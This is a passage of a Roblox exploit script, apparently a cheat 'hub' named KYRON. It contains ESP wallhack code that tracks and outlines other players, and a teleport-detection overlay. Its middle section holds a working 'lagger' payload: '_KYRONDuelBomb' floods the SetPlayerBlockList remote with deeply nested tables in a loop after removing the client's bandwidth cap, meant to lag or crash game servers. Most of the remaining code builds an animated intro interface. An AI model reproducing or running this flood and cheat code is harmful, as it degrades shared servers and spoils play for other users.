                local n41 = (v80.Y + v81.Y) / 2
                v78.box.Position = UDim2.new(0, n40 - n39 / 2, 0, n41 - n38 / 2)
                v78.box.Size = UDim2.new(0, n39, 0, n38)
                v78.box.Visible = true
                local n42 = n41 + n38 / 2
                local n43 = n40 - n34
                local n44 = n42 - n35
                local v82 = math.sqrt(n43 * n43 + n44 * n44)
                v78.tracer.Position = UDim2.new(0, (n34 + n40) / 2, 0, (n35 + n42) / 2)
                v78.tracer.Size = UDim2.new(0, v82, 0, 1)
                v78.tracer.Rotation = math.deg(math.atan2(n44, n43))
                v78.tracer.Visible = _G._KYRONESPShowTracer == true
                v78.speedLbl.Text = v79 and "" or string.format("Speed: %.1f", humanoidRootPart2.AssemblyLinearVelocity.Magnitude)
                v78.header.Visible = v79 == nil
              else
                v78.box.Visible = false
                v78.tracer.Visible = false
              end
            end
          end
        end)

        -- ESP, void-ghost visuals, and tracer settings.
        -- Vanta-style Anti TP ESP
        do
          local oldRuntime = _G._KYRONAntiTpEspRuntime
          if oldRuntime and oldRuntime.Destroy then
            pcall(oldRuntime.Destroy)
          end

          local antiTpEsp = {
            Settings = {
              MaxDistance = 300,
              MaxAcceptedSpeed = 300,
              GhostShowDistance = 6,
              GhostLifetime = 1.5,
            },
            Connections = {},
            Ghosts = {},
          }

          local function enabled()
            return _G._KYRONAntiTPESP == true
          end

          local function connect(connection)
            table.insert(antiTpEsp.Connections, connection)
            return connection
          end

          local ghostFolder = Workspace:FindFirstChild("KYRONAntiTpGhosts")
          if ghostFolder then
            pcall(function() ghostFolder:Destroy() end)
          end

          ghostFolder = Instance.new("Folder")
          ghostFolder.Name = "KYRONAntiTpGhosts"
          ghostFolder.Parent = Workspace

          local function removeGhost(player)
            local state = antiTpEsp.Ghosts[player]
            if state and state.marker then
              pcall(function() state.marker:Destroy() end)
            end
            antiTpEsp.Ghosts[player] = nil
          end

          local function getState(player)
            local state = antiTpEsp.Ghosts[player]
            if state then
              return state
            end

            local marker = Instance.new("Part")
            marker.Name = "AntiTP_" .. player.Name
            marker.Size = Vector3.new(2, 5, 1)
            marker.Anchored = true
            marker.CanCollide = false
            marker.CanQuery = false
            marker.CanTouch = false
            marker.Material = Enum.Material.Neon
            marker.Color = _G._KYRONAccent or Color3.fromRGB(190, 120, 255)
            marker.Transparency = 1
            marker.Parent = ghostFolder

            state = {
              marker = marker,
              lastPosition = nil,
              lastTime = os.clock(),
              expires = 0,
            }
            antiTpEsp.Ghosts[player] = state
            return state
          end

          for _, player in ipairs(Players2:GetPlayers()) do
            if player ~= localPlayer2 then
              getState(player)
            end
          end

          connect(Players2.PlayerAdded:Connect(function(player)
            if player ~= localPlayer2 then
              getState(player)
            end
          end))

          connect(Players2.PlayerRemoving:Connect(removeGhost))

          connect(RunService2.Heartbeat:Connect(function()
            local localCharacter = localPlayer2.Character
            local localRoot = localCharacter and localCharacter:FindFirstChild("HumanoidRootPart")
            local now = os.clock()
            local accent = _G._KYRONAccent or Color3.fromRGB(190, 120, 255)

            for _, player in ipairs(Players2:GetPlayers()) do
              if player ~= localPlayer2 then
                local state = getState(player)
                local character = player.Character
                local root = character and character:FindFirstChild("HumanoidRootPart")

                if root then
                  state.marker.Color = accent
                  local position = root.Position

                  if state.lastPosition then
                    local dt = math.max(now - state.lastTime, 1 / 240)
                    local distance = (position - state.lastPosition).Magnitude
                    local speed = distance / dt

                    if enabled()
                      and speed > antiTpEsp.Settings.MaxAcceptedSpeed
                      and distance > antiTpEsp.Settings.GhostShowDistance then
                      state.marker.CFrame = CFrame.new(state.lastPosition)
                      state.marker.Transparency = 0.55
                      state.expires = now + antiTpEsp.Settings.GhostLifetime
                    end
                  end

                  state.lastPosition = position
                  state.lastTime = now

                  local farAway = localRoot
                    and (state.marker.Position - localRoot.Position).Magnitude > antiTpEsp.Settings.MaxDistance

                  if not enabled() or now > state.expires or farAway then
                    state.marker.Transparency = 1
                  end
                else
                  state.marker.Transparency = 1
                  state.lastPosition = nil
                  state.lastTime = now
                end
              end
            end
          end))

          antiTpEsp.Destroy = function()
            for _, connection in ipairs(antiTpEsp.Connections) do
              pcall(function() connection:Disconnect() end)
            end
            antiTpEsp.Connections = {}

            for player in pairs(antiTpEsp.Ghosts) do
              removeGhost(player)
            end

            pcall(function() ghostFolder:Destroy() end)

            if _G._KYRONAntiTpEspRuntime == antiTpEsp then
              _G._KYRONAntiTpEspRuntime = nil
            end
          end

          _G._KYRONAntiTpEspRuntime = antiTpEsp
        end

        _G._KYRONESPSetEnabled = function(KYRONESPEnabled)
          _G._KYRONESPEnabled = KYRONESPEnabled

          if KYRONESPEnabled then
            for _, player in ipairs(Players2:GetPlayers()) do
              if player ~= localPlayer2 and not tbl37[player] then
                fn59(player)
              end
            end
          else
            for k in pairs(tbl37) do
              fn60(k)
            end

            for k in pairs(obj) do
              _G._KYRONESPClearVoidGhost(k)
            end
          end
        end

        _G._KYRONESPApplyAccent = function(arg)
          do
            color2 = arg or _G._KYRONAccent or Color3.fromRGB(255, 240, 255)

            for _, v78 in pairs(tbl37) do
              if v78.boxSt then
                v78.boxSt.Color = color2
              end

              if v78.tracer then
                v78.tracer.BackgroundColor3 = color2
              end

              if v78.speedLbl then
                v78.speedLbl.TextColor3 = color2
              end

              if v78.hl then
                v78.hl.FillColor = color2
                v78.hl.OutlineColor = color2
              end
            end

            return
          end
        end

        _G._KYRONESPSetShowHeader = function(arg)
          _G._KYRONESPShowHeader = arg and true or false
        end

        _G._KYRONESPSetShowTracer = function(arg)
          _G._KYRONESPShowTracer = arg and true or false
        end

        _G._KYRONESPSetEnabled(false)
      end

      fn55()
    end
  end

  do
    local function fn55()
      local Players2 = game:GetService("Players")
      local RunService2 = game:GetService("RunService")
      local localPlayer2 = Players2.LocalPlayer
      local tbl37 = { minX = -535.7, maxX = -422, minY = -7.9, maxY = 115, minZ = -72, maxZ = 193.3 }
      local obj = setmetatable({}, { __mode = "k" })

      local function fn56(arg)
        return arg.X >= tbl37.minX and arg.X <= tbl37.maxX and arg.Y >= tbl37.minY and arg.Y <= tbl37.maxY and arg.Z >= tbl37.minZ and arg.Z <= tbl37.maxZ
      end

      RunService2.Heartbeat:Connect(function()
        if not _G._KYRONESPEnabled then
          return
        end
        local now2 = os.clock()

        for _, player in ipairs(Players2:GetPlayers()) do
          if player ~= localPlayer2 then
            local character = player.Character
            local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
            character = character and character:FindFirstChildOfClass("Humanoid")
            local tbl38 = obj[player] or { history = {}, ghost = nil, walked = 0, last = nil }
            obj[player] = tbl38

            if humanoidRootPart and character and character.Health > 0 then
              local cFrame = humanoidRootPart.CFrame
              local position = cFrame.Position

              if tbl38.ghost then
                if tbl38.last and fn56(position) then
                  local n34 = position - tbl38.last
                  local magnitude = Vector3.new(n34.X, 0, n34.Z).Magnitude

                  if magnitude < 50 then
                    tbl38.walked = tbl38.walked + magnitude
                  end
                end

                tbl38.last = position

                if tbl38.walked >= 15 then
                  tbl38.ghost = nil
                  tbl38.walked = 0
                  tbl38.history = {}

                  if _G._KYRONESPClearVoidGhost then
                    _G._KYRONESPClearVoidGhost(player)
                  end
                elseif _G._KYRONESPSetVoidGhost then
                  _G._KYRONESPSetVoidGhost(player, tbl38.ghost)
                end
              else
                table.insert(tbl38.history, { time = now2, cframe = cFrame })

                while #tbl38.history > 0 and now2 - tbl38.history[1].time > 0.07 do
                  table.remove(tbl38.history, 1)
                end

                local v78 = tbl38.history[1]

                if v78 then
                  local magnitude = (position - v78.cframe.Position).Magnitude
                  local n34 = math.abs(position.Y - v78.cframe.Position.Y)

                  if (magnitude >= 150 or n34 >= 100) and fn56(v78.cframe.Position) then
                    local v79 = 0
                    tbl38.ghost = v78.cframe
                    tbl38.walked = v79
                    tbl38.history = {}

                    if _G._KYRONESPSetVoidGhost then
                      _G._KYRONESPSetVoidGhost(player, tbl38.ghost)
                    end
                  end
                end

                tbl38.last = position
              end
            elseif tbl38.ghost then
              tbl38.ghost = nil

              if _G._KYRONESPClearVoidGhost then
                _G._KYRONESPClearVoidGhost(player)
              end
            end
          end
        end
      end)

      Players2.PlayerRemoving:Connect(function(player)
        obj[player] = nil

        if _G._KYRONESPClearVoidGhost then
          _G._KYRONESPClearVoidGhost(player)
        end
      end)
    end

    fn55()
  end

  _G._KYRONDuelBomb = function(arg)
    local tbl37 = {}
    local tbl38 = { {} }
    local v78 = tbl38[1]

    for i = 1, arg do
      local tbl39 = {}
      table.insert(v78, tbl39)
      v78 = tbl39
    end

    for i = 1, math.min(499999 / (arg + 2), 1500) do
      table.insert(tbl37, tbl38)
    end

    pcall(function()
      game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(tbl37)
    end)
  end

  _G._KYRONStartLagger = function()
    if laggerState.active then
      return
    end
    laggerState.active = true

    laggerState.thread = task.spawn(function()
      while laggerState.active do
        pcall(function()
          game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
        end)

        _G._KYRONDuelBomb(laggerState.packets or 270)
        task.wait(laggerState.delay or 0.25)
      end
    end)
  end

  _G._KYRONStopLagger = function()
    laggerState.active = false

    if laggerState.thread then
      pcall(function()
        task.cancel(laggerState.thread)
      end)

      laggerState.thread = nil
    end
  end

  if not _G._KYRONResolveSaveApi() then
    task.wait(1.5)
    _G._KYRONResolveSaveApi()
  end

  fn43()

  task.spawn(function()
    while task.wait(12) do
      if fn42() then
        if autoSaveSettings.auto then
          pcall(saveKYRONSettings)
        end

        continue
      end

      break
    end
  end)

  pcall(function()
    game:BindToClose(function()
      if fn42() then
        pcall(saveKYRONSettings, true)
      end
    end)
  end)

  pcall(function()
    localPlayer.OnTeleport:Connect(function()
      if fn42() then
        pcall(saveKYRONSettings, true)
      end
    end)
  end)

  do
    local function fn55()
      local screenGui

      do
        local playerGui2 = localPlayer:WaitForChild("PlayerGui")
        local KYRONHubPolished = playerGui2:FindFirstChild("KYRONHubPolished")

        if KYRONHubPolished then
          KYRONHubPolished:Destroy()
        end

        screenGui = Instance.new("ScreenGui")
        -- Main hub interface: panels, navigation, and controls.
        screenGui.Name = "KYRONHubPolished"
        screenGui.ResetOnSpawn = false
        screenGui.IgnoreGuiInset = true
        screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        screenGui.DisplayOrder = 5
        pcall(function()
          screenGui.ClipToDeviceSafeArea = true
          screenGui.SafeAreaCompatibility = Enum.SafeAreaCompatibility.Fullscreen
        end)
        screenGui.Parent = playerGui2

        -- Keep Roblox topbar / chat / leave / player list usable while KYRON is loaded.
        local function KYRONEnsureCoreGuiVisible()
          local StarterGui = game:GetService("StarterGui")
          for _, coreType in ipairs({
            Enum.CoreGuiType.All,
            Enum.CoreGuiType.Chat,
            Enum.CoreGuiType.PlayerList,
            Enum.CoreGuiType.Backpack,
            Enum.CoreGuiType.EmotesMenu,
            Enum.CoreGuiType.Health,
            Enum.CoreGuiType.Captures,
          }) do
            pcall(function()
              StarterGui:SetCoreGuiEnabled(coreType, true)
            end)
          end
          pcall(function()
            StarterGui:SetCore("TopbarEnabled", true)
          end)
          pcall(function()
            -- Only unlock reset if Safe Mode is not actively locking it.
            local state = _G._KYRONSafeModeState
            if not (state and state.resetLocked) then
              StarterGui:SetCore("ResetButtonCallback", true)
            end
          end)
        end
        _G._KYRONEnsureCoreGuiVisible = KYRONEnsureCoreGuiVisible
        KYRONEnsureCoreGuiVisible()
        task.defer(KYRONEnsureCoreGuiVisible)
        task.delay(1, KYRONEnsureCoreGuiVisible)
        task.spawn(function()
          while screenGui.Parent do
            task.wait(4)
            pcall(KYRONEnsureCoreGuiVisible)
          end
        end)
      end

      local tbl37

      do
        local KYRONThemeIdx = math.clamp(tonumber(_G._KYRONThemeIdx) or 7, 1, #themePresets)
        local v78 = themePresets[KYRONThemeIdx]
        _G._KYRONThemeIdx = KYRONThemeIdx
        _G._KYRONAccent = v78.accent

        tbl37 = {
          bg = Color3.fromRGB(8, 8, 16),
          panel = Color3.fromRGB(0, 0, 0),
          row = Color3.fromRGB(0, 0, 0),
          rowHover = Color3.fromRGB(240, 255, 255),
          key = Color3.fromRGB(24, 8, 16),
          stroke = Color3.fromRGB(72, 60, 90),
          text = Color3.fromRGB(255, 255, 255),
          muted = Color3.fromRGB(190, 187, 202),
          accent = v78.accent,
          accentDark = v78.accentDark,
        }
      end

      local function KYRONPlayIntro()
        if _G._KYRONIntroCleanup then
          pcall(_G._KYRONIntroCleanup)
        end

        _G._KYRONIntroPlaying = true
        local flag28 = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled

        local tbl38 = {
          130451097419605,
          129030262345273,
          76292842640935,
          82757811555212,
          92910922537368,
          105960347086002,
          116720305084998,
          90341354549871,
          72399600208480,
          81834484116440,
        }

        local v78 = Random.new():NextInteger(1, 100)
        local str10 = v78 <= 12 and "chainSpear"
        local KYRONCurrentIntroVariant

        if str10 then
          KYRONCurrentIntroVariant = str10
        else
          KYRONCurrentIntroVariant = v78 <= 55 and "toji" or "gojo"
        end

        if _G._KYRONForceIntroVariant == "chainSpear" or _G._KYRONForceIntroVariant == "toji" or _G._KYRONForceIntroVariant == "gojo" then
          KYRONCurrentIntroVariant = _G._KYRONForceIntroVariant
        end

        _G._KYRONCurrentIntroVariant = KYRONCurrentIntroVariant
        local Lighting_2 = game:GetService("Lighting")
        local KYRONIntro = screenGui:FindFirstChild("KYRONIntro")

        if KYRONIntro then
          KYRONIntro:Destroy()
        end

        local KYRONIntroBlur = Lighting_2:FindFirstChild("KYRONIntroBlur")

        if KYRONIntroBlur then
          KYRONIntroBlur:Destroy()
        end

        local frame2 = Instance.new("Frame")
        frame2.Name = "KYRONIntro"
        frame2.BackgroundColor3 = Color3.fromRGB(10, 5, 8)
        frame2.BackgroundTransparency = 1
        frame2.BorderSizePixel = 0
        frame2.Size = UDim2.new(1, 0, 1, 0)
        frame2.ZIndex = 1000
        frame2.Visible = false
        frame2.Parent = screenGui
        local imageLabel = Instance.new("ImageLabel")
        imageLabel.Name = "IntroBackdropImage"
        imageLabel.BackgroundTransparency = 1
        imageLabel.Image = "rbxassetid://98541566010518"
        imageLabel.ImageTransparency = 1
        imageLabel.ScaleType = Enum.ScaleType.Fit
        imageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
        imageLabel.Position = UDim2.new(0.5, 0, 0.42, 0)
        imageLabel.Size = UDim2.new(0.92, 0, 0.5, 0)
        imageLabel.ZIndex = 1000
        imageLabel.Visible = KYRONCurrentIntroVariant == "wheel"
        imageLabel.Parent = frame2
        local uiScale = Instance.new("UIScale", imageLabel)
        local instance = Instance.new("Frame")
        instance.Name = "ChainSpearStage"
        instance.BackgroundTransparency = 1
        instance.AnchorPoint = Vector2.new(0.5, 0.5)
        instance.Position = UDim2.new(0.5, 0, 0.42, 0)
        instance.Size = flag28 and UDim2.new(0.64, 0, 0.64, 0) or UDim2.new(0.75, 0, 0.75, 0)
        instance.ClipsDescendants = false
        instance.Visible = KYRONCurrentIntroVariant == "chainSpear"
        instance.ZIndex = 1000
        instance.Parent = frame2
        local uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
        uiAspectRatioConstraint.AspectRatio = 1
        uiAspectRatioConstraint.DominantAxis = Enum.DominantAxis.Width
        uiAspectRatioConstraint.Parent = instance
        local uiSizeConstraint = Instance.new("UISizeConstraint")
        uiSizeConstraint.MinSize = Vector2.new(flag28 and 210 or 420, flag28 and 200 or 420)
        uiSizeConstraint.MaxSize = Vector2.new(flag28 and 280 or 680, flag28 and 280 or 680)
        uiSizeConstraint.Parent = instance
        local tbl39 = {}
        local tbl40 = {}
        local tbl41 = { -110, -96, -82, -69, -56, -45, -33, -23, -14, -6, 0 }
        local tbl42 = { 0.96, 0.94, 0.91, 0.87, 0.82, 0.75, 0.67, 0.57, 0.45, 0.3, 0.14 }

        for i, v79 in ipairs(tbl41) do
          local frame3 = Instance.new("Frame")
          frame3.Name = "ChainSpearRotor" .. i
          frame3.BackgroundTransparency = 1
          frame3.AnchorPoint = Vector2.new(0.5, 0.5)
          frame3.Position = UDim2.fromScale(0.5, 0.5)
          frame3.Size = UDim2.fromScale(1, 1)
          frame3.Rotation = v79
          frame3.ZIndex = 1000
          frame3.Parent = instance
          local imageLabel2 = Instance.new("ImageLabel")
          imageLabel2.Name = "ChainSpearTrail" .. i
          imageLabel2.BackgroundTransparency = 1
          imageLabel2.Image = "rbxassetid://118963313877514"
          imageLabel2.ImageColor3 = i == #tbl41 and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(205, 215, 225)
          imageLabel2.ImageTransparency = 1
          imageLabel2.ScaleType = Enum.ScaleType.Fit
          imageLabel2.AnchorPoint = Vector2.new(0.73, 0.02)
          imageLabel2.Position = UDim2.fromScale(0.5, 0.5)
          imageLabel2.Size = flag28 and UDim2.new(0.553, 0, 0.829, 0) or UDim2.new(0.49, 0, 0.735, 0)
          imageLabel2.ZIndex = 1000
          imageLabel2.Parent = frame3
          imageLabel2:SetAttribute("_KYRONTargetTransparency", tbl42[i])
          tbl39[i] = frame3
          tbl40[i] = imageLabel2
        end

        local frame3 = Instance.new("Frame")
        frame3.Name = "TojiCutoutStage"
        frame3.BackgroundTransparency = 1
        frame3.BorderSizePixel = 0
        frame3.AnchorPoint = Vector2.new(0.5, 0.5)
        frame3.Position = UDim2.new(0.5, 0, 0.42, 0)
        frame3.Size = flag28 and UDim2.new(0.76, 0, 0, 312) or UDim2.new(0.92, 0, 0.5, 0)
        frame3.Rotation = -2
        frame3.ClipsDescendants = false
        frame3.Visible = KYRONCurrentIntroVariant == "toji"
        frame3.ZIndex = 1000
        frame3.Parent = frame2
        local uiScale2 = Instance.new("UIScale")
        uiScale2.Scale = 1
        uiScale2.Parent = frame3
        local tbl43 = {}
        local tbl44 = {}
        local tbl45 = {}
        local tbl46 = {}
        local tbl47 = {}
        local tbl48 = { { -1, 0 }, { 1, 0 }, { 0, -1 }, { 0, 1 } }
        local tbl49 = { { -2, 0 }, { 2, 0 }, { 0, -2 }, { 0, 2 } }
        local tbl50 = {}
        local tbl51 = {}
        local imageLabel2 = Instance.new("ImageLabel")
        imageLabel2.Name = "TojiPantsWhiteFill"
        imageLabel2.BackgroundTransparency = 1
        imageLabel2.Image = "rbxassetid://82757811555212"
        imageLabel2.ImageColor3 = Color3.fromRGB(255, 255, 255)
        imageLabel2.ImageTransparency = 1
        imageLabel2.ScaleType = Enum.ScaleType.Fit
        imageLabel2.AnchorPoint = Vector2.new(0.5, 0.5)
        imageLabel2.Position = UDim2.fromScale(0.5, 0.5)
        imageLabel2.Size = UDim2.fromScale(1, 1)
        imageLabel2.ZIndex = 998
        imageLabel2.Parent = frame3

        local tbl52 = {
          [130451097419605] = true,
          [129030262345273] = true,
          [105960347086002] = true,
          [81834484116440] = true,
          [92910922537368] = true,
          [116720305084998] = true,
          [76292842640935] = true,
          [90341354549871] = true,
          [72399600208480] = true,
        }

        local tbl53 = { [129030262345273] = true, [105960347086002] = true, [81834484116440] = true }

        for i, v79 in ipairs(tbl38) do
          local tbl54 = {}

          for _, v80 in ipairs(tbl48) do
            local instance2 = Instance.new("ImageLabel")
            instance2.Name = "TojiSeamFill" .. i
            instance2.BackgroundTransparency = 1
            instance2.Image = "rbxassetid://" .. tostring(v79)
            instance2.ImageColor3 = Color3.fromRGB(10, 10, 8)
            instance2.ImageTransparency = 1
            instance2.ScaleType = Enum.ScaleType.Fit
            instance2.AnchorPoint = Vector2.new(0.5, 0.5)
            instance2.Position = UDim2.new(0.5, v80[1], 0.5, v80[2])
            instance2.Size = UDim2.fromScale(1, 1)
            instance2.ZIndex = 999
            instance2.Parent = frame3
            table.insert(tbl54, { image = instance2, x = v80[1], y = v80[2] })
          end

          local imageLabel3 = Instance.new("ImageLabel")
          imageLabel3.Name = "TojiPiece" .. i
          imageLabel3.BackgroundTransparency = 1
          imageLabel3.Image = "rbxassetid://" .. tostring(v79)
          imageLabel3.ImageTransparency = 1
          imageLabel3.ScaleType = Enum.ScaleType.Fit
          imageLabel3.AnchorPoint = Vector2.new(0.5, 0.5)
          imageLabel3.Position = UDim2.fromScale(0.5, 0.5)
          imageLabel3.Size = UDim2.fromScale(1, 1)
          imageLabel3.ZIndex = 1000
          imageLabel3.Parent = frame3
          tbl43[i] = imageLabel3
          tbl44[imageLabel3] = tbl54

          if v79 == 129030262345273 then
            local imageLabel4 = Instance.new("ImageLabel")
            imageLabel4.Name = "TojiSwordShine"
            imageLabel4.BackgroundTransparency = 1
            imageLabel4.Image = imageLabel3.Image
            imageLabel4.ImageColor3 = Color3.fromRGB(255, 240, 240)
            imageLabel4.ImageTransparency = 1
            imageLabel4.ScaleType = Enum.ScaleType.Fit
            imageLabel4.AnchorPoint = Vector2.new(0.5, 0.5)
            imageLabel4.Position = imageLabel3.Position
            imageLabel4.Size = imageLabel3.Size
            imageLabel4.ZIndex = 1001
            imageLabel4.Parent = frame3
            local uiGradient = Instance.new("UIGradient")
            uiGradient.Rotation = -25
            uiGradient.Offset = Vector2.new(-1, 0)
            local numberSequence = NumberSequence.new
            local tbl55 = {}
            local v80 = NumberSequenceKeypoint.new(0, 1)
            local v81 = NumberSequenceKeypoint.new(0.36, 1)
            local v82 = NumberSequenceKeypoint.new(0.5, 0)
            local v83 = NumberSequenceKeypoint.new(0.64, 1)
            local new = NumberSequenceKeypoint.new
            tbl55[1] = v80
            tbl55[2] = v81
            tbl55[3] = v82
            tbl55[4] = v83

            do
              local values = table.pack(new(1, 1))
              table.move(values, 1, values.n, 5, tbl55)
            end

            uiGradient.Transparency = numberSequence(tbl55)
            uiGradient.Parent = imageLabel4
            tbl46[imageLabel3] = { image = imageLabel4, gradient = uiGradient }
          end

          if v79 == 105960347086002 then
            local tbl55 = {}

            for _, v80 in ipairs(tbl49) do
              local imageLabel4 = Instance.new("ImageLabel")
              imageLabel4.Name = "TojiMovingHandWhiteFill"
              imageLabel4.BackgroundTransparency = 1
              imageLabel4.Image = "rbxassetid://" .. tostring(v79)
              imageLabel4.ImageColor3 = Color3.fromRGB(240, 240, 255)
              imageLabel4.ImageTransparency = 1
              imageLabel4.ScaleType = Enum.ScaleType.Fit
              imageLabel4.AnchorPoint = Vector2.new(0.5, 0.5)
              imageLabel4.Position = UDim2.new(0.5, v80[1], 0.5, v80[2])
              imageLabel4.Size = UDim2.fromScale(1, 1)
              imageLabel4.ZIndex = 998
              imageLabel4.Parent = frame3
              table.insert(tbl55, { image = imageLabel4, x = v80[1], y = v80[2] })
            end

            tbl45[imageLabel3] = tbl55
          end

          if tbl52[v79] then
            if v79 == 92910922537368 then
              tbl47[imageLabel3] = { x = 2, y = 3 }
            elseif v79 == 116720305084998 then
              tbl47[imageLabel3] = { x = 2, y = 5 }
            else
              tbl47[imageLabel3] = { x = 0, y = 0 }
            end

            table.insert(tbl50, imageLabel3)

            if tbl53[v79] then
              table.insert(tbl51, imageLabel3)
            end
          end
        end

        local function fn56(arg, arg2, rotation, arg3)
          local tbl54 = tbl44[arg] or {}
          local tbl55 = tbl45[arg] or {}
          local v79 = tbl46[arg]
          local tbl56 = tbl47[arg] or { x = 0, y = 0 }
          local udim2 = UDim2.new(arg2.X.Scale, arg2.X.Offset + tbl56.x, arg2.Y.Scale, arg2.Y.Offset + 5 + tbl56.y)

          if arg3 then
            TweenService:Create(arg, arg3, { Position = udim2, Rotation = rotation }):Play()

            for _, v80 in ipairs(tbl54) do
              TweenService:Create(v80.image, arg3, {
                Position = UDim2.new(udim2.X.Scale, udim2.X.Offset + v80.x, udim2.Y.Scale, udim2.Y.Offset + v80.y),
                Rotation = rotation,
              }):Play()
            end

            for _, v80 in ipairs(tbl55) do
              TweenService:Create(v80.image, arg3, {
                Position = UDim2.new(udim2.X.Scale, udim2.X.Offset + v80.x, udim2.Y.Scale, udim2.Y.Offset + v80.y),
                Rotation = rotation,
              }):Play()
            end

            if v79 then
              TweenService:Create(v79.image, arg3, { Position = udim2, Rotation = rotation }):Play()
            end
          else
            arg.Position = udim2
            arg.Rotation = rotation

            for _, v80 in ipairs(tbl54) do
              v80.image.Position = UDim2.new(udim2.X.Scale, udim2.X.Offset + v80.x, udim2.Y.Scale, udim2.Y.Offset + v80.y)
              v80.image.Rotation = rotation
            end

            for _, v80 in ipairs(tbl55) do
              v80.image.Position = UDim2.new(udim2.X.Scale, udim2.X.Offset + v80.x, udim2.Y.Scale, udim2.Y.Offset + v80.y)
              v80.image.Rotation = rotation
            end

            if v79 then
              v79.image.Position = udim2
              v79.image.Rotation = rotation
            end
          end
        end

        local tbl54 = { pieces = {}, layers = {}, birds = {}, sunLayers = {} }
        local tbl55 = {}
        local tbl56 = { id = 109352181830543, role = "torso", pivot = Vector2.new(0.5, 0.53) }
        local tbl57 = {
          id = 122114082580659,
          role = "torsoOverlay",
          pivot = Vector2.new(0.5, 0.53),
          parent = "torso",
        }

        local tbl58 = {
          id = 139479809590896,
          role = "straightLeg",
          pivot = Vector2.new(0.5537, 0.4321),
          parent = "torso",
        }

        local tbl59 = {
          id = 100210458187990,
          role = "straightBoot",
          pivot = Vector2.new(0.112, 0.2012),
          parent = "straightLeg",
        }

        local tbl60 = {
          id = 78084312740336,
          role = "bentLeg",
          pivot = Vector2.new(0.4586, 0.4857),
          parent = "torso",
        }
        local tbl61 = {
          id = 73089083195386,
          role = "bentBoot",
          pivot = Vector2.new(0.2577, 0.456),
          parent = "bentLeg",
        }
        local tbl62 = {
          id = 106466482082324,
          role = "leftHand",
          pivot = Vector2.new(0.135, 0.6286),
          parent = "torso",
        }
        local tbl63 = {
          id = 105145816596875,
          role = "rightHand",
          pivot = Vector2.new(0.8436, 0.5786),
          parent = "torso",
        }
        local tbl64 = {
          id = 119573317226147,
          role = "head",
          pivot = Vector2.new(0.6503, 0.7274),
          parent = "torso",
        }
        local tbl65 = {
          id = 92470817410025,
          role = "hair",
          pivot = Vector2.new(0.684, 0.8095),
          parent = "head",
        }
        tbl55[1] = tbl56
        tbl55[2] = tbl57
        tbl55[3] = tbl58
        tbl55[4] = tbl59
        tbl55[5] = tbl60
        tbl55[6] = tbl61
        tbl55[7] = tbl62
        tbl55[8] = tbl63
        tbl55[9] = tbl64
        tbl55[10] = tbl65
        local frame4 = Instance.new("Frame")
        frame4.Name = "GojoCutoutStage"
        frame4.BackgroundTransparency = 1
        frame4.BorderSizePixel = 0
        frame4.AnchorPoint = Vector2.new(0.5, 0.5)
        frame4.Position = UDim2.new(0.5, 0, 0.42, 0)
        frame4.Size = flag28 and UDim2.new(0.76, 0, 0, 312) or UDim2.new(0.92, 0, 0.62, 0)
        frame4.Rotation = -38
        frame4.ClipsDescendants = false
        frame4.Visible = KYRONCurrentIntroVariant == "gojo"
        frame4.ZIndex = 1000
        frame4.Parent = frame2
        tbl54.stage = frame4
        local uiAspectRatioConstraint2 = Instance.new("UIAspectRatioConstraint")
        uiAspectRatioConstraint2.Name = "GojoSourceAspect"
        uiAspectRatioConstraint2.AspectRatio = 0.77619047619047621
        uiAspectRatioConstraint2.DominantAxis = Enum.DominantAxis.Height
        uiAspectRatioConstraint2.Parent = frame4
        local uiScale3 = Instance.new("UIScale")
        uiScale3.Name = "GojoScale"
        uiScale3.Scale = 1
        uiScale3.Parent = frame4
        tbl54.scale = uiScale3
        tbl54.active = false

        for i, v79 in ipairs(tbl55) do
          local instance2 = Instance.new("Frame")
          instance2.Name = "GojoJoint_" .. v79.role
          instance2.BackgroundTransparency = 1
          instance2.BorderSizePixel = 0
          instance2.AnchorPoint = Vector2.new(0.5, 0.5)
          local parent = v79.parent and tbl54.layers[v79.parent]

          if parent then
            instance2.Position = UDim2.fromScale(0.5 + v79.pivot.X - parent.pivot.X, 0.5 + v79.pivot.Y - parent.pivot.Y)
          else
            instance2.Position = UDim2.fromScale(v79.pivot.X, v79.pivot.Y)
          end

          instance2.Size = UDim2.fromScale(1, 1)
          instance2.ZIndex = 1000 + i
          instance2.Parent = parent and parent.image or frame4
          local imageLabel3 = Instance.new("ImageLabel")
          imageLabel3.Name = "Gojo_" .. v79.role
          imageLabel3.BackgroundTransparency = 1
          imageLabel3.BorderSizePixel = 0
          imageLabel3.Image = "rbxassetid://" .. tostring(v79.id)
          imageLabel3.ImageColor3 = Color3.fromRGB(255, 240, 255)
          imageLabel3.ImageTransparency = 1
          imageLabel3.ScaleType = Enum.ScaleType.Stretch
          imageLabel3.AnchorPoint = Vector2.new(0, 0)
          imageLabel3.Position = UDim2.fromScale(0.5 - v79.pivot.X, 0.5 - v79.pivot.Y)
          imageLabel3.Size = UDim2.fromScale(1, 1)
          imageLabel3.ZIndex = 1000 + i
          imageLabel3.Parent = instance2
          tbl54.pieces[i] = imageLabel3
          tbl54.layers[v79.role] = { image = instance2, pivot = v79.pivot, basePosition = instance2.Position }
        end

        tbl54.addBird = function(arg)
          local n34 = flag28 and 18 or 34
          local frame5 = Instance.new("Frame")
          frame5.Name = "GojoBird" .. arg
          frame5.BackgroundTransparency = 1
          frame5.BorderSizePixel = 0
          frame5.AnchorPoint = Vector2.new(0.5, 0.5)
          frame5.Position = UDim2.fromScale(0.5, 0.42)
          frame5.Size = UDim2.fromOffset(n34, math.floor(n34 * 0.56))
          frame5.Visible = KYRONCurrentIntroVariant == "gojo"
          frame5.ZIndex = 1015
          frame5.Parent = frame2
          local n35 = math.floor(n34 * 0.58)
          local n36 = flag28 and 2 or 3
          local frame6 = Instance.new("Frame")
          frame6.Name = "LeftWing"
          frame6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
          frame6.BackgroundTransparency = 1
          frame6.BorderSizePixel = 0
          frame6.AnchorPoint = Vector2.new(0.5, 0.5)
          frame6.Position = UDim2.new(0.5, -n35 * 0.23, 0.5, 0)
          frame6.Size = UDim2.fromOffset(n35, n36)
